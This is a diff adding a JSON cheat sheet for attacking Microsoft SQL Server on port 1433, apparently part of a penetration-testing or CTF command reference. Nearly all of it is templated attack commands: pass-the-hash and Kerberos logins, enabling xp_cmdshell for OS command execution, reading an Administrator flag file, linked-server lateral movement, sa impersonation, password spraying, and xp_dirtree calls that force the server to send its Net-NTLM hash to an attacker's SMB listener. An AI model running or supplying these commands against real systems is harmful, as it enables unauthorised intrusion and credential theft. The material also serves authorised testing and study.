@@ -1,0 +1,156 @@
+{
+  "port": 1433,
+  "protocol": "tcp",
+  "service": "MSSQL",
+  "description": "Microsoft SQL Server — database enumeration, command execution via xp_cmdshell, credential extraction, and Net-NTLM hash capture.",
+  "tools": [
+    {
+      "name": "mssqlclient.py (Impacket)",
+      "description": "Interactive MSSQL client supporting Windows authentication, SQL authentication, pass-the-hash, and Kerberos.",
+      "commands": [
+        {
+          "title": "Windows auth with password",
+          "command": "mssqlclient.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}' -windows-auth",
+          "description": "Connect using Windows/domain authentication."
+        },
+        {
+          "title": "Windows auth with PtH",
+          "command": "mssqlclient.py -hashes ':{{HASH}}' '{{DOMAIN}}/{{USERNAME}}@{{IP}}' -windows-auth",
+          "description": "Connect using pass-the-hash with Windows auth."
+        },
+        {
+          "title": "Windows auth with Kerberos",
+          "command": "mssqlclient.py -k -no-pass '{{DOMAIN}}/{{USERNAME}}@{{TARGET_HOSTNAME}}' -windows-auth",
+          "description": "Connect using Kerberos authentication."
+        },
+        {
+          "title": "SQL auth with password",
+          "command": "mssqlclient.py '{{USERNAME}}:{{PASSWORD}}@{{IP}}'",
+          "description": "Connect using SQL Server authentication (sa, dbadmin, etc.)."
+        },
+        {
+          "title": "SQL auth as sa",
+          "command": "mssqlclient.py 'sa:{{PASSWORD}}@{{IP}}'",
+          "description": "Connect as the SQL Server sa account."
+        },
+        {
+          "title": "Enable xp_cmdshell",
+          "command": "SQL> enable_xp_cmdshell",
+          "description": "Enable xp_cmdshell for OS command execution (run inside mssqlclient session)."
+        },
+        {
+          "title": "Execute OS command via xp_cmdshell",
+          "command": "SQL> xp_cmdshell whoami",
+          "description": "Execute an OS command via xp_cmdshell (run inside mssqlclient session)."
+        },
+        {
+          "title": "Capture Net-NTLM hash via xp_dirtree",
+          "command": "SQL> xp_dirtree '\\\\{{TARGET_IP}}\\share'",
+          "description": "Force the SQL server to authenticate to your SMB listener and capture its Net-NTLM hash."
+        },
+        {
+          "title": "Read a file via xp_cmdshell",
+          "command": "SQL> xp_cmdshell type C:\\Users\\Administrator\\Desktop\\flag.txt",
+          "description": "Read a file on the target via OS command."
+        },
+        {
+          "title": "Enumerate databases",
+          "command": "SQL> SELECT name FROM master.dbo.sysdatabases;",
+          "description": "List all databases on the SQL server."
+        },
+        {
+          "title": "Enumerate linked servers",
+          "command": "SQL> SELECT srvname, isremote FROM sysservers;",
+          "description": "List linked SQL servers (potential lateral movement path)."
+        },
+        {
+          "title": "Execute on linked server",
+          "command": "SQL> EXECUTE('xp_cmdshell ''whoami''') AT [{{LINKED_SERVER}}];",
+          "description": "Execute a command on a linked SQL server."
+        },
+        {
+          "title": "Impersonate another user",
+          "command": "SQL> EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;",
+          "description": "Impersonate the sa login if impersonation privileges exist."
+        }
+      ]
+    },
+    {
+      "name": "NetExec (nxc) — MSSQL",
+      "description": "MSSQL enumeration, credential validation, and command execution via NetExec.",
+      "commands": [
+        {
+          "title": "Authenticate with password",
+          "command": "nxc mssql {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}'",
+          "description": "Test SQL credentials against the target."
+        },
+        {
+          "title": "Authenticate with Windows auth",
+          "command": "nxc mssql {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -d '{{DOMAIN}}'",
+          "description": "Test Windows/domain credentials."
+        },
+        {
+          "title": "Authenticate with PtH",
+          "command": "nxc mssql {{IP}} -u '{{USERNAME}}' -H '{{HASH}}'",
+          "description": "Authenticate using an NTLM hash."
+        },
+        {
+          "title": "Execute SQL query",
+          "command": "nxc mssql {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -q 'SELECT name FROM master.dbo.sysdatabases;'",
+          "description": "Execute a SQL query on the target."
+        },
+        {
+          "title": "Execute OS command (-x)",
+          "command": "nxc mssql {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -x 'whoami /all'",
+          "description": "Execute an OS command via xp_cmdshell."
+        },
+        {
+          "title": "Execute PowerShell (-X)",
+          "command": "nxc mssql {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -X 'Get-Process'",
+          "description": "Execute a PowerShell command via xp_cmdshell."
+        },
+        {
+          "title": "Enumerate databases",
+          "command": "nxc mssql {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -q 'SELECT name FROM sys.databases;'",
+          "description": "List all databases."
+        },
+        {
+          "title": "Check for sysadmin role",
+          "command": "nxc mssql {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -q 'SELECT IS_SRVROLEMEMBER(''sysadmin'');'",
+          "description": "Check if the current user has sysadmin privileges."
+        },
+        {
+          "title": "Password spray",
+          "command": "nxc mssql {{IP}} -u {{USERLIST}} -p '{{PASSWORD}}' --continue-on-success",
+          "description": "Spray a single password against multiple SQL accounts."
+        },
+        {
+          "title": "Capture Net-NTLM hash",
+          "command": "nxc mssql {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -x \"xp_dirtree '\\\\{{TARGET_IP}}\\share'\"",
+          "description": "Force MSSQL to authenticate to your SMB listener."
+        }
+      ]
+    },
+    {
+      "name": "sqsh",
+      "description": "Command-line SQL client for interactive MSSQL sessions.",
+      "commands": [
+        {
+          "title": "Connect with SQL auth",
+          "command": "sqsh -S {{IP}} -U '{{USERNAME}}' -P '{{PASSWORD}}'",
+          "description": "Connect using SQL Server authentication."
+        },
+        {
+          "title": "Connect with Windows auth",
+          "command": "sqsh -S {{IP}} -U '{{DOMAIN}}\\{{USERNAME}}' -P '{{PASSWORD}}'",
+          "description": "Connect using Windows/domain authentication."
+        },
+        {
+          "title": "Execute inline query",
+          "command": "sqsh -S {{IP}} -U '{{USERNAME}}' -P '{{PASSWORD}}' -C 'SELECT @@version; GO'",
+          "description": "Execute a query non-interactively and display results."
+        }
+      ]
+    }
+  ]
+}
